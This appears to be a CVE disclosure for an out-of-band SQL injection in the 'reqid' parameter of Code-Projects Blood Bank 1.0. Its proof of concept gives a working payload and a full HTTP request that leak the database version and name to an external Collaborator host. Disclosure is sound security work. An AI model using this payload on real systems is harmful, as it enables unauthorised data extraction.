# CVE-2023-46021-Code-Projects-Blood-Bank-1.0-OOB-SQL-Injection-Vulnerability
+ Exploit Author: ersinerenler
# Vendor Homepage
+ https://code-projects.org/blood-bank-in-php-with-source-code
# Software Link
+ https://download-media.code-projects.org/2020/11/Blood_Bank_In_PHP_With_Source_code.zip
# Overview
+ Code-Projects Blood Bank V1.0 is exposed to a critical security vulnerability involving Out-of-Band (OOB) SQL Injection through the 'reqid' parameter in the /cancel.php file. This vulnerability arises due to a lack of proper protection mechanisms, enabling attackers to abuse the parameter and conduct OOB SQL injection attacks via Burp Collaborator. This may result in unauthorized access and extraction of sensitive information from the databases.
# Vulnerability Details
+ CVE ID: CVE-2023-46021
+ Affected Version: Blood Bank V1.0
+ Vulnerable File: /cancel.php
+ Parameter Name: reqid
+ Attack Type: Local
# References:
+ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-46021
+ https://nvd.nist.gov/vuln/detail/CVE-2023-46021
# Description
+ The 'reqid' parameter in the /cancel.php file of Code-Projects Blood Bank V1.0 is susceptible to Out-of-Band SQL Injection. This vulnerability stems from inadequate protection mechanisms, allowing attackers to exploit the parameter using Burp Collaborator to initiate OOB SQL injection attacks. Through this technique, an attacker can potentially extract sensitive information from the databases.

# Proof of Concept (PoC) : 
+ Intercept the request to cancel.php via Burp Suite
+ Inject the payload to the vulnerable parameters
+ Payload: `4'%2b(select%20load_file(concat('\\\\',version(),'.',database(),'.collaborator-domain\\a.txt')))%2b'`
+ Example request for `reqid` parameter

```
---
GET /bloodbank/file/cancel.php?reqid=4'%2b(select%20load_file(concat('\\\\',version(),'.',database(),'.7mus27hip62tznk3gy4n7z3fo6uxin6c.oastify.com\\a.txt')))%2b' HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Referer: http://localhost/bloodbank/sentrequest.php?msg=You%20have%20requested%20for%20blood%20group%20A+.%20Our%20team%20will%20contact%20you%20soon.
Cookie: PHPSESSID=<some-cookie-value>
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
---
```
+ Database and version information was seized via Burp Suite Collaborator
<img width="1447" alt="image" src="https://github.com/ersinerenler/CVE-2023-46021-Code-Projects-Blood-Bank-1.0-SQL-Injection-Vulnerability/assets/113091631/89240445-cf5f-4c14-aba5-e3238ca56914">
